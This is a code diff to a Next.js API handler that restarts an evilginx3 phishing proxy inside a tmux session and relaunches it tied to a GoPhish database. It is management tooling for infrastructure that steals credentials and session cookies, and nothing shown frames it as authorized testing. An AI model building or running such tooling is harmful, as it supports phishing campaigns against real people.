@@ -3,6 +3,7 @@ import { exec } from "child_process";
 import { promisify } from "util";
 
 const execAsync = promisify(exec);
+const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
 
 export default async function handler(
   req: NextApiRequest,
@@ -13,7 +14,7 @@ export default async function handler(
   }
 
   try {
-    console.log("Starting evilginx quit process...");
+    console.log("Starting evilginx restart process...");
 
     // Get detailed information about tmux sessions
     const { stdout: tmuxOutput } = await execAsync(
@@ -32,6 +33,16 @@ export default async function handler(
         await execAsync(`tmux send-keys -t "${ginxSession}" q Enter`);
         console.log("Sent quit command");
 
+        // Wait for evilginx to quit completely
+        await sleep(2000);
+        console.log("Waited for evilginx to quit");
+
+        // Send the restart command
+        await execAsync(
+          `tmux send-keys -t "${ginxSession}" "./evilginx3 -feed -g ../gophish/gophish.db" Enter`
+        );
+        console.log("Sent restart command");
+
         // Additional debug - list tmux sessions after command
         const { stdout: afterTmux } = await execAsync(
           "tmux ls 2>/dev/null || echo 'No tmux sessions'"
@@ -39,7 +50,7 @@ export default async function handler(
         console.log("Tmux sessions after command:", afterTmux);
 
         return res.status(200).json({
-          message: "Quit command sent to evilginx",
+          message: "Evilginx restarted successfully",
           debug: {
             tmuxBefore: tmuxOutput,
             tmuxAfter: afterTmux,
